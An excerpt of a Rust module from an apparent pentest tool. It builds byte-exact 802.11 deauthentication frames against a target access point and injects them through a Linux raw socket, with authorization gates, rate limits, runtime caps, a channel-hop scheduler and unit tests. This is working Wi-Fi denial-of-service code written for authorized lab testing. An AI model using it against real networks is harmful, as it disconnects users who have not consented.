//! Authorized 802.11 injection support for the wifi layer: the
//! BSSID-directed deauthentication frame builder (Bettercap `wifi.deauth`
//! parity), the AF_PACKET transmit path (Linux-only, mirroring the receive
//! socket), the burst rate limiter, and the bounded channel-hop scheduler.
//!
//! Policy (mirrors `active_arp` and the ARP spoofer): injection is ACTIVE
//! interference and exists only for explicitly authorized pentest lab work.
//! The embedding application MUST hold the shared active-operation gate, show
//! the native confirmation dialog naming the targets and the exact frame
//! counts, and restrict every target to BSSIDs its own monitor session
//! observed — this module never widens or re-derives a scope. Bounds are
//! hard: at most [`MAX_DEAUTH_TARGETS`] target BSSIDs per run, at most
//! [`MAX_DEAUTH_BURSTS`] bursts, at most [`MAX_FRAMES_PER_BURST`] deauth
//! frames per burst across ALL targets, frame pacing >=
//! [`MIN_FRAME_INTERVAL_MS`], burst gaps >= [`MIN_BURST_INTERVAL_MS`], and a
//! hard [`MAX_DEAUTH_RUN_MS`] runtime cap after which the loop auto-stops.
//! Channel hops are bounded to [`MAX_HOP_CHANNELS`] in-band frequencies with
//! a [`MIN_HOP_INTERVAL_MS`]..=[`MAX_HOP_INTERVAL_MS`] interval and a
//! [`MAX_HOP_LOG`]-entry hop log.
//!
//! Frame shape (byte-exact, see [`deauth_frame`]): a management frame
//! (type 0) with subtype 12 (deauthentication), neither to-DS nor from-DS:
//!
//! ```text
//! offset  bytes  field
//! 0       C0 00  frame control: version 0, type 0 (mgmt), subtype 12, no flags
//! 2       00 00  duration
//! 4       6      addr1 = target BSSID (receiver: the AP; its clients honor it)
//! 10      6      addr2 = OUR monitor-interface MAC (transmitter, never spoofed)
//! 16      6      addr3 = target BSSID (the management frame's BSSID field)
//! 22      00 00  sequence control
//! 24      07 00  reason code 7, little-endian: Class 3 frame from a
//!                nonassociated STA (802.11-2020 Table 9-45)
//! ```
//!
//! Total 26 bytes; [`inject_frame`] prefixes the minimal zero-field radiotap
//! header ([`tx_radiotap_prefix`], 8 bytes) so monitor-interface drivers
//! apply their default TX parameters — 34 bytes on the wire.
//!
//! Platform honesty: the transmit door is Linux AF_PACKET only
//! ([`injection_supported`]); every other platform reports
//! `WifiMonitorError::Unsupported` before any OS call. The pure core (frames,
//! pacing, plan validation, the run loop, the hop scheduler) is
//! platform-independent and unit-tested everywhere with an injected clock.
//! Malformed input is refused with a coded error, never unwrapped, never
//! panicking.
use crate::wifi::{WifiError, WifiMonitorError};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};

/// Reason code carried by every deauth frame this module builds: Class 3
/// frame received from a nonassociated station.
pub const DEAUTH_REASON_CLASS_3_FROM_NONASSOCIATED: u16 = 7;
/// One 802.11 deauth frame: 24-byte management header + 2-byte reason code.
pub const DEAUTH_FRAME_LEN: usize = 26;
/// Minimal zero-field radiotap TX prefix (version/pad/it_len/present).
pub const TX_RADIOTAP_LEN: usize = 8;
/// Full injectable frame: radiotap prefix + deauth frame.
pub const INJECT_FRAME_LEN: usize = TX_RADIOTAP_LEN + DEAUTH_FRAME_LEN;

/// Target BSSIDs per deauth run (session-observed, mirror of the IPC bound).
pub const MAX_DEAUTH_TARGETS: usize = 4;
/// Bursts per deauth run.
pub const MAX_DEAUTH_BURSTS: usize = 4;
/// Deauth frames per burst across ALL targets.
pub const MAX_FRAMES_PER_BURST: usize = 32;
/// Hard runtime cap per deauth run, then the loop auto-stops.
pub const MAX_DEAUTH_RUN_MS: u64 = 10_000;
/// Minimum gap between two consecutive deauth frames (<= 50 frames/s).
pub const MIN_FRAME_INTERVAL_MS: u64 = 20;
/// Minimum gap between two bursts.
pub const MIN_BURST_INTERVAL_MS: u64 = 100;
/// Max park between stop/scope/runtime checks: stop latency stays ~20 ms.
pub const MAX_PARK_SLICE_MS: u64 = 20;

/// Channels per hop plan (mirror of the capture-frequency bound).
pub const MAX_HOP_CHANNELS: usize = 16;
/// Hop interval bounds: one hop per interval, never faster, never slower.
pub const MIN_HOP_INTERVAL_MS: u64 = 250;
pub const MAX_HOP_INTERVAL_MS: u64 = 2_000;
/// Full hop-log bound (oldest entries evicted first).
pub const MAX_HOP_LOG: usize = 256;

fn protocol(message: impl Into<String>) -> WifiError {
    WifiError::new(WifiMonitorError::Protocol, message)
}

/// True only where the OS exposes a raw 802.11 transmit door (Linux
/// AF_PACKET; CAP_NET_RAW is checked at open time).
pub fn injection_supported() -> bool {
    cfg!(target_os = "linux")
}

fn valid_unicast_mac(mac: [u8; 6]) -> bool {
    mac != [0; 6] && mac[0] & 1 == 0
}

// ---------------------------------------------------------------------------
// Frame builders (pure, all platforms so fixtures are testable everywhere).
// ---------------------------------------------------------------------------

/// The BSSID-directed broadcast deauthentication frame, byte-exact: addr1 =
/// `bssid` (the AP; every one of its associated stations honors the
/// deauth), addr2 = `our_mac` (OUR monitor interface — the transmitter is
/// never impersonated), addr3 = `bssid`, reason 7. Refuses multicast/zero
/// addresses and a zero reason code.
pub fn deauth_frame(
    bssid: [u8; 6],
    our_mac: [u8; 6],
    reason: u16,
) -> Result<[u8; DEAUTH_FRAME_LEN], WifiError> {
    if !valid_unicast_mac(bssid) {
        return Err(protocol(
            "deauth target BSSID must be a non-zero unicast MAC address",
        ));
    }
    if !valid_unicast_mac(our_mac) {
        return Err(protocol(
            "the deauth transmitter MAC must be a non-zero unicast address — injection never \
             impersonates another station",
        ));
    }
    if reason == 0 {
        return Err(protocol("deauth reason code must be non-zero"));
    }
    let mut f = [0u8; DEAUTH_FRAME_LEN];
    // Frame control: version 0, type 0 (management), subtype 12 (deauth),
    // no to/from-DS, not protected — little-endian on the wire.
    f[0] = 0xC0;
    f[1] = 0x00;
    // Duration stays zero; addr1/addr2/addr3 and the reason body are filled
    // below; sequence control stays 0x0000 (the driver may rewrite it).
    f[4..10].copy_from_slice(&bssid);
    f[10..16].copy_from_slice(&our_mac);
    f[16..22].copy_from_slice(&bssid);
    // Management body fields are little-endian on the wire (mirrors the
    // parser's `le16_at` in frame.rs).
    f[24..26].copy_from_slice(&reason.to_le_bytes());
    Ok(f)
}

/// Minimal radiotap TX prefix: version 0, pad 0, it_len 8, present bitmap 0
/// (no fields — drivers apply their default TX rate and flags).
pub fn tx_radiotap_prefix() -> [u8; TX_RADIOTAP_LEN] {
    let mut out = [0u8; TX_RADIOTAP_LEN];
    out[2..4].copy_from_slice(&(TX_RADIOTAP_LEN as u16).to_le_bytes());
    out
}

/// The full frame handed to the AF_PACKET socket: radiotap prefix + deauth.
pub fn inject_frame(
    bssid: [u8; 6],
    our_mac: [u8; 6],
    reason: u16,
) -> Result<[u8; INJECT_FRAME_LEN], WifiError> {
    let mut out = [0u8; INJECT_FRAME_LEN];
    out[..TX_RADIOTAP_LEN].copy_from_slice(&tx_radiotap_prefix());
    out[TX_RADIOTAP_LEN..].copy_from_slice(&deauth_frame(bssid, our_mac, reason)?);
    Ok(out)
}

// ---------------------------------------------------------------------------
// Plan validation + pacing (pure, all platforms).
// ---------------------------------------------------------------------------

/// Validate one authorized deauth run: 1..=[`MAX_DEAUTH_TARGETS`] distinct
/// unicast BSSIDs, 1..=[`MAX_DEAUTH_BURSTS`] bursts, 1..=[`MAX_FRAMES_PER_BURST`]
/// frames per target, and at most [`MAX_FRAMES_PER_BURST`] frames per burst
/// across all targets. Refusal, never silent truncation.
pub fn validate_deauth_plan(
    targets: &[[u8; 6]],
    bursts: usize,
    frames_per_target: usize,
) -> Result<(), WifiError> {
    if targets.is_empty() || targets.len() > MAX_DEAUTH_TARGETS {
        return Err(protocol(format!(
            "deauth supports 1..={MAX_DEAUTH_TARGETS} target BSSIDs per run"
        )));
    }
    let mut seen: Vec<[u8; 6]> = Vec::new();
    for &bssid in targets {
        if !valid_unicast_mac(bssid) {
            return Err(protocol(
                "deauth target BSSID must be a non-zero unicast MAC address",
            ));
        }
        if seen.contains(&bssid) {
            return Err(protocol("duplicate deauth target BSSID"));
        }
        seen.push(bssid);
    }
    if bursts == 0 || bursts > MAX_DEAUTH_BURSTS {
        return Err(protocol(format!(
            "deauth supports 1..={MAX_DEAUTH_BURSTS} bursts per run"
        )));
    }
    if frames_per_target == 0 || frames_per_target > MAX_FRAMES_PER_BURST {
        return Err(protocol(format!(
            "deauth frames per target must be 1..={MAX_FRAMES_PER_BURST}"
        )));
    }
    let per_burst = frames_per_target
        .checked_mul(targets.len())
        .ok_or_else(|| protocol("deauth burst size overflow"))?;
    if per_burst > MAX_FRAMES_PER_BURST {
        return Err(protocol(format!(
            "a burst carries at most {MAX_FRAMES_PER_BURST} deauth frames across all targets \
             ({} targets x {} frames = {per_burst})",
            targets.len(),
            frames_per_target,
        )));
    }
    Ok(())
}

/// Frame/burst pacer: one frame at most every [`MIN_FRAME_INTERVAL_MS`], one
/// burst at most every [`MIN_BURST_INTERVAL_MS`]. Due times are computed from
/// the CURRENT time after each send, so a stalled worker never bursts to
/// catch up — honest pacing, no debt (mirrors `SpoofPacer`).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct DeauthPacer {
    frame_interval_ms: u64,
    burst_interval_ms: u64,
    next_frame_due_ms: u64,
    next_burst_due_ms: u64,
}

impl Default for DeauthPacer {
    fn default() -> Self {
        Self::new()
    }
}

impl DeauthPacer {
    pub fn new() -> Self {
        Self {
            frame_interval_ms: MIN_FRAME_INTERVAL_MS,
            burst_interval_ms: MIN_BURST_INTERVAL_MS,
            next_frame_due_ms: 0,
            next_burst_due_ms: 0,
        }
    }
    pub fn frame_ready(&self, now_ms: u64) -> bool {
        now_ms >= self.next_frame_due_ms
    }
    pub fn advance_frame(&mut self, now_ms: u64) {
        self.next_frame_due_ms = now_ms + self.frame_interval_ms;
    }
    pub fn burst_ready(&self, now_ms: u64) -> bool {
        now_ms >= self.next_burst_due_ms
    }
    pub fn advance_burst(&mut self, now_ms: u64) {
        self.next_burst_due_ms = now_ms + self.burst_interval_ms;
    }
}

/// Injectable monotonic clock (ms since run start). The Linux shim derives it
/// from `Instant`; tests drive it deterministically.
pub trait InjectClock {
    fn now_ms(&self) -> u64;
    /// Park at most `max_ms`; the loop re-checks stop/scope/runtime after it.
    fn park(&mut self, max_ms: u64);
}

/// Honest end-of-run reason: the loop always says how it stopped.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DeauthEndReason {
    /// Every authorized burst completed.
    Completed,
    OperatorStop,
    ScopeRevoked,
    RuntimeCapReached,
    /// A send failed mid-run; nothing further is transmitted.
    SendFailure,
}

/// Outcome of one bounded deauth run. Frames are counted ONLY when the send
/// syscall accepted the full frame.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DeauthOutcome {
    pub frames_sent: u64,
    pub bursts_completed: usize,
    pub end_reason: DeauthEndReason,
    /// Last send error seen mid-run (present only with `SendFailure`).
    pub error: Option<WifiError>,
}

/// Park in bounded slices until `ready(now_ms)`; aborts honestly on operator
/// stop, scope revocation or the runtime cap. The stop flag is checked
/// BEFORE every readiness check, so cancellation latency is one park slice,
/// never a frame.
fn park_until_ready(
    clock: &mut impl InjectClock,
    stop: &AtomicBool,
    scope_active: &(impl Fn() -> bool + Sync),
    ready: impl Fn(u64) -> bool,
) -> Option<DeauthEndReason> {
    loop {
        if stop.load(Ordering::Acquire) {
            return Some(DeauthEndReason::OperatorStop);
        }
        if !scope_active() {
            return Some(DeauthEndReason::ScopeRevoked);
        }
        let now = clock.now_ms();
        if now >= MAX_DEAUTH_RUN_MS {
            return Some(DeauthEndReason::RuntimeCapReached);
        }
        if ready(now) {
            return None;
        }
        let remaining = MAX_DEAUTH_RUN_MS.saturating_sub(now);
        let slice = MAX_PARK_SLICE_MS.min(remaining.max(1));
        clock.park(slice.max(1));
    }
}

/// The platform-independent deauth loop: `bursts` rounds of
/// `frames_per_target` frames per target, paced by [`DeauthPacer`], stop- and
/// scope-aware before every frame, hard-capped at [`MAX_DEAUTH_RUN_MS`]. The
/// frames are prebuilt once (pure builders), so the loop's only per-frame
/// work is pacing + the injected send. Errors: plan/transmitter validation
/// (`WifiMonitorError::Protocol`); every run end is an honest
/// [`DeauthOutcome`], never an error.
pub fn run_deauth_loop(
    targets: &[[u8; 6]],
    bursts: usize,
    frames_per_target: usize,
    our_mac: [u8; 6],
    stop: &AtomicBool,
    scope_active: &(impl Fn() -> bool + Sync),
    clock: &mut impl InjectClock,
    sent_counter: &AtomicU64,
    send: &mut impl FnMut(&[u8]) -> Result<(), WifiError>,
) -> Result<DeauthOutcome, WifiError> {
    validate_deauth_plan(targets, bursts, frames_per_target)?;
    if !valid_unicast_mac(our_mac) {
        return Err(protocol(
            "the deauth transmitter MAC must be a non-zero unicast address — injection never \
             impersonates another station",
        ));
    }
    let reason = DEAUTH_REASON_CLASS_3_FROM_NONASSOCIATED;
    let mut frames: Vec<Vec<u8>> = Vec::with_capacity(targets.len());
    for &target in targets {
        frames.push(inject_frame(target, our_mac, reason)?.to_vec());
    }
    let mut pacer = DeauthPacer::new();
    let mut sent = 0u64;
    let mut bursts_completed = 0usize;
    let mut abort: Option<DeauthEndReason> = None;
    'bursts: for burst in 0..bursts {
        if burst > 0 {
            pacer.advance_burst(clock.now_ms());
            if let Some(reason) = park_until_ready(clock, stop, scope_active, |now| {
                pacer.burst_ready(now)
            }) {
                abort = Some(reason);
                break 'bursts;
            }
        }
        for _index in 0..frames_per_target {
            for frame in &frames {
                if let Some(reason) = park_until_ready(
                    clock,
                    stop,
                    scope_active,
                    |now| pacer.frame_ready(now),
                ) {
                    abort = Some(reason);
                    break 'bursts;
                }
                if let Err(err) = send(frame) {
                    sent_counter.store(sent, Ordering::Release);
                    return Ok(DeauthOutcome {
                        frames_sent: sent,
                        bursts_completed,
                        end_reason: DeauthEndReason::SendFailure,
                        error: Some(err),
                    });
                }
                sent += 1;
                sent_counter.store(sent, Ordering::Release);
                pacer.advance_frame(clock.now_ms());
            }
        }
        bursts_completed += 1;
    }
    sent_counter.store(sent, Ordering::Release);
    Ok(DeauthOutcome {
        frames_sent: sent,
        bursts_completed,
        end_reason: abort.unwrap_or(DeauthEndReason::Completed),
        error: None,
    })
}

// ---------------------------------------------------------------------------
// Channel-hop scheduler (pure, all platforms): bounded sequence, pause with
// capture, honest no-catch-up resume, full bounded hop log.
// ---------------------------------------------------------------------------

/// One recorded hop: when it happened (ms since the hop run started) and the
/// frequency transition it drove on the radio.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct HopEntry {
    pub at_ms: u64,
    pub from_mhz: u32,
    pub to_mhz: u32,
}

fn in_legal_band(freq_mhz: u32) -> bool {
    (2_412..=2_484).contains(&freq_mhz)
        || (5_160..=5_885).contains(&freq_mhz)
        || (5_945..=7_115).contains(&freq_mhz)
}

/// Validate a hop plan's channel list: 1..=[`MAX_HOP_CHANNELS`] distinct
/// in-band frequencies (the same bands the nl80211 SET_CHANNEL encoder
/// accepts).
pub fn validate_hop_channels(channels: &[u32]) -> Result<(), WifiError> {
    if channels.is_empty() || channels.len() > MAX_HOP_CHANNELS {
        return Err(protocol(format!(
            "channel hopping supports 1..={MAX_HOP_CHANNELS} frequencies per plan"
        )));
    }
    let mut seen: Vec<u32> = Vec::new();
    for &freq in channels {
        if !in_legal_band(freq) {
            return Err(protocol(format!(
                "frequency {freq} MHz is outside the supported Wi-Fi bands"
            )));
        }
        if seen.contains(&freq) {
            return Err(protocol(format!("duplicate hop frequency {freq} MHz")));
        }
        seen.push(freq);
    }
    Ok(())
}

/// Validate a hop interval: [`MIN_HOP_INTERVAL_MS`]..=[`MAX_HOP_INTERVAL_MS`].
pub fn validate_hop_interval_ms(interval_ms: u64) -> Result<(), WifiError> {
    if !(MIN_HOP_INTERVAL_MS..=MAX_HOP_INTERVAL_MS).contains(&interval_ms) {
        return Err(protocol(format!(
            "hop interval must be {MIN_HOP_INTERVAL_MS}..={MAX_HOP_INTERVAL_MS} ms"
        )));
    }
    Ok(())
}

/// The bounded channel-hop scheduler. Pure and clock-injected: the caller
/// drives `tick(now_ms)` at its own cadence and applies returned hops to the
/// radio (nl80211 SET_CHANNEL on the IPC layer). Pause freezes hops (the
/// capture keeps running); resume re-arms from the CURRENT time so a long
/// pause never bursts hops to catch up. Every applied hop is recorded in a
/// log bounded at [`MAX_HOP_LOG`] entries (oldest evicted first).
#[derive(Debug)]
pub struct ChannelHopScheduler {
    channels: Vec<u32>,
    interval_ms: u64,
    position: usize,
    paused: bool,
    next_hop_due_ms: u64,
    hops: u64,
    log: Vec<HopEntry>,
}

impl ChannelHopScheduler {
    pub fn new(channels: Vec<u32>, interval_ms: u64) -> Result<Self, WifiError> {
        validate_hop_channels(&channels)?;
        validate_hop_interval_ms(interval_ms)?;
        Ok(Self {
            channels,
            interval_ms,
            position: 0,
            paused: false,
            next_hop_due_ms: interval_ms,
            hops: 0,
            log: Vec::new(),
        })
    }
    /// The frequency the scheduler currently drives (starts at channels[0]).
    pub fn current(&self) -> u32 {
        self.channels
            .get(self.position)
            .copied()
            .expect("position stays inside the validated channel list")
    }
    pub fn channels(&self) -> &[u32] {
        &self.channels
    }
    pub fn interval_ms(&self) -> u64 {
        self.interval_ms
    }
    pub fn is_paused(&self) -> bool {
        self.paused
    }
    pub fn hops(&self) -> u64 {
        self.hops
    }
    pub fn hop_log(&self) -> &[HopEntry] {
        &self.log
    }
    /// Freeze hops on the current frequency; the capture keeps running.
    pub fn pause(&mut self) {
        self.paused = true;
    }
    /// Resume with the next hop scheduled a FULL interval from `now_ms` —
    /// never a catch-up burst after a long pause.
    pub fn resume(&mut self, now_ms: u64) {
        if self.paused {
            self.paused = false;
            self.next_hop_due_ms = now_ms + self.interval_ms;
        }
    }
    /// Advance the schedule: `Some(to_mhz)` when a hop is due (and not
    /// paused). The next due time is computed from the CURRENT time, so a
    /// stalled caller never owes a hop burst.
    pub fn tick(&mut self, now_ms: u64) -> Option<u32> {
        if self.paused || now_ms < self.next_hop_due_ms {
            return None;
        }
        let from = self.current();
        self.position = (self.position + 1) % self.channels.len();
        let to = self.current();
        self.hops += 1;
        self.log.push(HopEntry {
            at_ms: now_ms,
            from_mhz: from,
            to_mhz: to,
        });
        if self.log.len() > MAX_HOP_LOG {
            self.log.remove(0);
        }
        self.next_hop_due_ms = now_ms + self.interval_ms;
        Some(to)
    }
}

// ---------------------------------------------------------------------------
// Linux socket client: AF_PACKET SOCK_RAW bound to the monitor interface,
// transmit only. Mirrors the crate's nl80211 client + active_arp shims.
// ---------------------------------------------------------------------------

#[cfg(target_os = "linux")]
mod linux_client {
    use super::*;
    use crate::live::{discover_interfaces, select_interface};
    use std::ffi::{c_int, c_void};
    use std::io;
    use std::os::fd::RawFd;
    use std::path::Path;
    use std::time::{Duration, Instant};

    const AF_PACKET: c_int = 17;
    const SOCK_RAW: c_int = 3;
    const SOCK_CLOEXEC: c_int = 0o2000000;
    /// ETH_P_ALL: the protocol monitor-mode injection uses (mirrors the
    /// receive socket in the IPC monitor pump).
    const ETH_P_ALL: u16 = 0x0003;
    /// Largest injectable frame (crate radiotap + 802.11 bounds).
    const MAX_INJECT_BYTES: usize =
        super::super::radiotap::MAX_HEADER_BYTES + super::super::frame::MAX_FRAME_BYTES;

    #[repr(C)]
    struct SockAddrLl {
        family: u16,
        protocol: u16,
        ifindex: c_int,
        hatype: u16,
        pkttype: u8,
        halen: u8,
        addr: [u8; 8],
    }

    unsafe extern "C" {
        fn socket(domain: c_int, typ: c_int, protocol: c_int) -> c_int;
        fn bind(fd: c_int, address: *const c_void, length: u32) -> c_int;
        fn send(fd: c_int, data: *const c_void, length: usize, flags: c_int) -> isize;
        fn close(fd: c_int) -> c_int;
    }

    struct Fd(RawFd);
    impl Drop for Fd {
        fn drop(&mut self) {
            unsafe {
                close(self.0);
            }
        }
    }

    fn io_err(context: &str) -> WifiError {
        let err = io::Error::last_os_error();
        let code = if err.kind() == io::ErrorKind::PermissionDenied {
            WifiMonitorError::Permission
        } else {
            WifiMonitorError::Io
        };
        WifiError::new(code, format!("{context}: {err}"))
    }

    /// OUR monitor interface's MAC, read from sysfs. Injection transmits
    /// with this real identity; it never impersonates another station.
    pub(super) fn interface_mac(name: &str) -> Result<[u8; 6], WifiError> {
        let path = Path::new("/sys/class/net").join(name).join("address");
        let value = std::fs::read_to_string(path)
            .map_err(|e| WifiError::new(WifiMonitorError::Device, format!("read interface MAC: {e}")))?;
        let parts: Vec<_> = value.trim().split(':').collect();
        if parts.len() != 6 {
            return Err(WifiError::new(
                WifiMonitorError::Device,
                "selected interface hardware address invalid",
            ));
        }
        let mut mac = [0; 6];
        for (slot, piece) in mac.iter_mut().zip(parts) {
            *slot = u8::from_str_radix(piece, 16).map_err(|_| {
                WifiError::new(WifiMonitorError::Device, "selected interface MAC malformed")
            })?;
        }
        if !valid_unicast_mac(mac) {
            return Err(WifiError::new(
                WifiMonitorError::Device,
                "selected interface does not have a unicast MAC",
            ));
        }
        Ok(mac)
    }

    /// The transmit socket: AF_PACKET SOCK_RAW bound to the monitor
    /// interface. It has no receive path by construction — the capture pump
    /// owns receiving.
    pub(super) struct InjectSocket {
        fd: Fd,
    }

    impl InjectSocket {
        pub(super) fn open(ifindex: i32) -> Result<Self, WifiError> {
            let protocol = ETH_P_ALL.to_be();
            let fd = unsafe { socket(AF_PACKET, SOCK_RAW | SOCK_CLOEXEC, c_int::from(protocol)) };
            if fd < 0 {
                return Err(io_err("open authorized 802.11 injection interface"));
            }
            let fd = Fd(fd);
            let address = SockAddrLl {
                family: AF_PACKET as u16,
                protocol,
                ifindex,
                hatype: 0,
                pkttype: 0,
                halen: 0,
                addr: [0; 8],
            };
            if unsafe {
                bind(
                    fd.0,
                    (&raw const address).cast(),
                    std::mem::size_of::<SockAddrLl>() as u32,
                )
            } < 0
            {
                return Err(io_err("bind selected monitor interface for injection"));
            }
            Ok(Self { fd })
        }

        /// Send one bounded frame; the syscall must accept it in full.
        pub(super) fn send_frame(&self, frame: &[u8]) -> Result<(), WifiError> {
            if frame.is_empty() || frame.len() > MAX_INJECT_BYTES {
                return Err(protocol("injectable frame size outside the bounds"));
            }
            let sent = unsafe { send(self.fd.0, frame.as_ptr().cast(), frame.len(), 0) };
            if sent != frame.len() as isize {
                return Err(io_err("send one authorized 802.11 frame"));
            }
            Ok(())
        }
    }

    struct RunClock {
        started: Instant,
    }
    impl InjectClock for RunClock {
        fn now_ms(&self) -> u64 {
            self.started.elapsed().as_millis().min(u64::MAX as u128) as u64
        }
        fn park(&mut self, max_ms: u64) {
            // Small slices keep stop/timeout latency at ~20 ms.
            std::thread::sleep(Duration::from_millis(max_ms.min(MAX_PARK_SLICE_MS)));
        }
    }

    /// Resolve the interface, read OUR MAC, open the TX socket and run the
    /// bounded loop. The radio channel is whatever the monitor session
    /// pinned — callers keep the target AP on the current channel.
    pub(super) fn run(
        interface_name: &str,
        targets: &[[u8; 6]],
        bursts: usize,
        frames_per_target: usize,
        stop: &AtomicBool,
        scope_active: &(impl Fn() -> bool + Sync),
        sent_counter: &AtomicU64,
    ) -> Result<DeauthOutcome, WifiError> {
        let all =
            discover_interfaces().map_err(|e| WifiError::new(WifiMonitorError::Device, e.message))?;
        let selected = select_interface(&all, interface_name)
            .map_err(|e| WifiError::new(WifiMonitorError::Device, e.message))?;
        let our_mac = interface_mac(&selected.name)?;
        let ifindex = i32::try_from(selected.index).map_err(|_| {
            WifiError::new(
                WifiMonitorError::Device,
                "network interface index exceeds native range",
            )
        })?;
        let socket = InjectSocket::open(ifindex)?;
        let mut clock = RunClock {
            started: Instant::now(),
        };
        run_deauth_loop(
            targets,
            bursts,
            frames_per_target,
            our_mac,
            stop,
            scope_active,
            &mut clock,
            sent_counter,
            &mut |frame| socket.send_frame(frame),
        )
    }
}

/// The authorized injection entry point. Preflight (stop/scope/plan) runs on
/// every platform; transmission is Linux AF_PACKET only and every other
/// platform reports `WifiMonitorError::Unsupported` before touching the
/// network. `sent_counter` is updated after EVERY transmitted frame so an
/// embedding IPC layer can report live counts while the run is pacing.
pub fn run_wifi_deauth(
    interface_name: &str,
    targets: &[[u8; 6]],
    bursts: usize,
    frames_per_target: usize,
    stop: &AtomicBool,
    scope_active: &(impl Fn() -> bool + Sync),
    sent_counter: &AtomicU64,
) -> Result<DeauthOutcome, WifiError> {
    // Cancellation is checked before anything else: a stop that arrived
    // before the run is an honest zero-frame outcome, not an error.
    if stop.load(Ordering::Acquire) {
        return Ok(DeauthOutcome {
            frames_sent: 0,
            bursts_completed: 0,
            end_reason: DeauthEndReason::OperatorStop,
            error: None,
        });
    }
    if !scope_active() {
        return Ok(DeauthOutcome {
            frames_sent: 0,
            bursts_completed: 0,
            end_reason: DeauthEndReason::ScopeRevoked,
            error: None,
        });
    }
    validate_deauth_plan(targets, bursts, frames_per_target)?;
    #[cfg(target_os = "linux")]
    {
        linux_client::run(
            interface_name,
            targets,
            bursts,
            frames_per_target,
            stop,
            scope_active,
            sent_counter,
        )
    }
    #[cfg(not(target_os = "linux"))]
    {
        let _ = (interface_name, sent_counter);
        Err(WifiError::new(
            WifiMonitorError::Unsupported,
            "wifi injection currently requires Linux AF_PACKET and CAP_NET_RAW",
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;

    const AP: [u8; 6] = [0xa4, 0xb1, 0xc1, 0xd2, 0xe3, 0xf0];
    const OUR: [u8; 6] = [0x02, 0x00, 0x00, 0x00, 0x00, 0x01];
    const OTHER_AP: [u8; 6] = [0x02, 0x00, 0x00, 0x00, 0x00, 0xfe];

    /// Deterministic fake clock: `park` advances time by the slice asked.
    struct FakeClock {
        now: u64,
    }
    impl InjectClock for FakeClock {
        fn now_ms(&self) -> u64 {
            self.now
        }
        fn park(&mut self, max_ms: u64) {
            self.now += max_ms;
        }
    }

    /// A stalled worker: every park overshoots by 5 s, which is exactly how
    /// the hard runtime cap is reached even with tiny frame counts.
    struct StallClock {
        now: u64,
    }
    impl InjectClock for StallClock {
        fn now_ms(&self) -> u64 {
            self.now
        }
        fn park(&mut self, _max_ms: u64) {
            self.now += 5_000;
        }
    }

    #[test]
    fn deauth_frame_matches_the_hand_built_fixture_byte_for_byte() {
        let frame = deauth_frame(AP, OUR, DEAUTH_REASON_CLASS_3_FROM_NONASSOCIATED)
            .expect("valid fixture identities");
        let mut expected = [0u8; DEAUTH_FRAME_LEN];
        expected[0] = 0xC0; // FC low: version 0, type 0 (mgmt), subtype 12
        expected[1] = 0x00; // FC high: no flags (no to/from-DS, not protected)
        expected[2] = 0x00; // duration low
        expected[3] = 0x00; // duration high
        expected[4..10].copy_from_slice(&AP); // addr1 = target BSSID (receiver)
        expected[10..16].copy_from_slice(&OUR); // addr2 = OUR monitor MAC (transmitter)
        expected[16..22].copy_from_slice(&AP); // addr3 = BSSID field
        expected[22] = 0x00; // seq-ctrl low
        expected[23] = 0x00; // seq-ctrl high
        expected[24] = 0x07; // reason 7 low byte
        expected[25] = 0x00; // reason 7 high byte (little-endian body field)
        assert_eq!(frame, expected);
        assert_eq!(frame.len(), DEAUTH_FRAME_LEN);
        assert_eq!(DEAUTH_FRAME_LEN, 26);
        assert_eq!(INJECT_FRAME_LEN, 34);
    }

    #[test]
    fn deauth_frame_refuses_multicast_zero_and_zero_reason_identities() {
        let multicast = [0x03, 0x00, 0x00, 0x00, 0x00, 0x01];
        let zero = [0u8; 6];
        assert!(deauth_frame(multicast, OUR, 7).is_err());
        assert!(deauth_frame(zero, OUR, 7).is_err());
        assert!(deauth_frame(AP, zero, 7).is_err(), "transmitter never zero");
        assert!(deauth_frame(AP, multicast, 7).is_err());
        assert!(deauth_frame(AP, OUR, 0).is_err(), "reason must be non-zero");
        assert!(deauth_frame(AP, OUR, 1).is_ok());
    }

    #[test]
    fn inject_frame_prefixes_the_minimal_zero_field_radiotap_header() {
        let frame = inject_frame(AP, OUR, 7).expect("valid identities");
        assert_eq!(frame.len(), INJECT_FRAME_LEN);
        assert_eq!(&frame[..TX_RADIOTAP_LEN], &[0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00]);
        assert_eq!(&frame[TX_RADIOTAP_LEN..], &deauth_frame(AP, OUR, 7).expect("frame"));
        assert_eq!(&frame[TX_RADIOTAP_LEN + 4..TX_RADIOTAP_LEN + 10], &AP);
        assert_eq!(&frame[TX_RADIOTAP_LEN + 10..TX_RADIOTAP_LEN + 16], &OUR);
    }

    #[test]
    fn the_built_deauth_round_trips_through_the_landed_frame_parser() {
        // The builder and the landed parser must agree byte-for-byte on the
        // wire format: the parsed roles restore exactly what we encoded.
        let frame = deauth_frame(AP, OUR, 7).expect("frame");
        let parsed = crate::wifi::frame::parse(&frame, false, false).expect("parses");
        assert_eq!(parsed.frame_type, crate::wifi::frame::FC_TYPE_MANAGEMENT);
        assert_eq!(parsed.subtype, crate::wifi::frame::SUBTYPE_DEAUTHENTICATION);
        assert!(!parsed.to_ds && !parsed.from_ds && !parsed.protected);
        assert_eq!(parsed.roles.destination, AP);
        assert_eq!(parsed.roles.source, OUR, "we transmit with our real MAC");
        assert_eq!(parsed.roles.bssid, Some(AP));
        assert_eq!(parsed.roles.receiver, AP);
        assert_eq!(parsed.roles.transmitter, OUR);
        match parsed.kind {
            crate::wifi::frame::FrameKind::Deauthentication { reason } => assert_eq!(reason, 7),
            other => panic!("unexpected kind {other:?}"),
        }
    }

    #[test]
    fn deauth_pacer_paces_frames_and_bursts_without_catchup() {
        let mut pacer = DeauthPacer::new();
        assert_eq!(pacer.frame_interval_ms, MIN_FRAME_INTERVAL_MS);
        assert_eq!(pacer.burst_interval_ms, MIN_BURST_INTERVAL_MS);
        // First frame is immediately due; the next is a full interval later.
        assert!(pacer.frame_ready(0));
        pacer.advance_frame(0);
        assert!(!pacer.frame_ready(19));
        assert!(pacer.frame_ready(20));
        // A stalled worker does not owe a burst: advancing late schedules the
        // next frame from NOW, not from the overdue deadline.
